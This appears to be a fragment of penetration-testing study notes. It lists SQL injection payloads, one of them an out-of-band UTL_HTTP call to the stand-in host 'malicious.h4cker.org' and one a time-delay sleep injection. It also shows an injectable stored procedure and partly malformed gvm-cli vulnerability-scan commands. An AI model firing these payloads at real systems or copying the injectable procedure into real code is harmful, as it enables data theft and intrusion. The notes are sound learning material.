http://store.h4cker.org/buy,e.php?id=8||UTL_HTTP.request('malicious.h4cker.org')||SELECT user FROM DUAL)--

forces the server to delay the response by 10 seconds:
?id=8 AND ID(version() like '8%', sleep(10), 'false'))-- // time delay

Stored procedures
create procedure user_login @username varchar(20), @passwd varchar(20) As Declare @sqlstring varchar(250) Set @sqlstring = ' Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd exec(@sqlstring) Go


gvm-cli tls --gmp-username admin --hostname 10.1.1.13 --xml "<create_target><name>Metasploitablt</name><hosts>10.1.1.14</hosts></create_target>"


gvm-cli tls --gmp-username admin \
--hostname 10.1.1.13 \
--xml "<create_target><name>Metasploitablt</name> \
<target id=\"swewegfewg\"></target> \
<config id=\"aefefw\"></config><create_task>"

gvm-pyshell 
